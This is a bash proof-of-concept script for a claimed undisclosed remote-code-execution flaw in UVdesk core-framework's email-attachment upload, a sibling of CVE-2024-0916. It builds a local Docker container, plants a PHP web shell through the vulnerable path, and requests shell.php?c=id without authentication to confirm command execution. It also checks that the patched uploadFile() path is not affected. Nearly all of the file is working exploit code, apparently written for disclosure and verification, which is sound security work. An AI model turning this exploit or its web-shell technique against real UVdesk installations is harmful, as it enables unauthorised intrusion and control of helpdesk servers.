#!/bin/bash
# One-command PoC: UVdesk core-framework Localhost::uploadEmailAttachment()
# renameFile=false regression - undisclosed sibling of the CVE-2024-0916 fix.
# Full writeup in README.md.
set -euo pipefail
cd "$(dirname "$0")"

IMAGE=apex-uvdesk-mailbox-poc
CONTAINER=apex-uvdesk-mailbox-poc-run
PORT=8912

cleanup() {
    docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
}
trap cleanup EXIT

echo "[*] Building image (real, pinned core-framework@3b31910 Localhost.php, unmodified)..."
docker build -t "$IMAGE" . -q

cleanup
echo "[*] Starting container (plants malicious email attachment via the real vulnerable code path, then serves public/ over Apache)..."
docker run -d --name "$CONTAINER" -p "$PORT:80" "$IMAGE" >/dev/null

echo "[*] Waiting for Apache to come up..."
for i in $(seq 1 20); do
    if curl -s -o /dev/null "http://127.0.0.1:$PORT/"; then
        break
    fi
    sleep 0.5
done

echo
echo "=== Container boot log (shows the plant step + filesystem proof) ==="
docker logs "$CONTAINER" 2>&1 | sed -n '1,40p'

echo
echo "=== [PROOF] curl the written attachment path directly - no auth, no cookies, nothing ==="
URL="http://127.0.0.1:$PORT/assets/threads/999/shell.php?c=id"
echo "GET $URL"
RESPONSE=$(curl -s "$URL")
echo "Response: $RESPONSE"

if echo "$RESPONSE" | grep -q "APEX-UVDESK-MAILBOX-RCE-POC"; then
    echo
    echo "*** RCE CONFIRMED: attacker-supplied PHP from an email attachment executed unauthenticated. ***"
else
    echo
    echo "!!! PoC did not reproduce - response did not contain the expected marker. !!!"
    exit 1
fi

echo
echo "=== [CONTROL] the sibling function uploadFile() (2025-patched path) does NOT reproduce ==="
CONTROL_NAME=$(docker exec "$CONTAINER" find /var/www/app/public/assets/threads/999-control -type f)
echo "Control upload landed at: $CONTROL_NAME"
if [[ "$CONTROL_NAME" == *shell.php ]]; then
    echo "UNEXPECTED: control path also kept the attacker's filename."
else
    echo "Confirmed: uploadFile()'s 2025 fix renamed the file away from 'shell.php' - the fix works here, just not on uploadEmailAttachment()."
fi
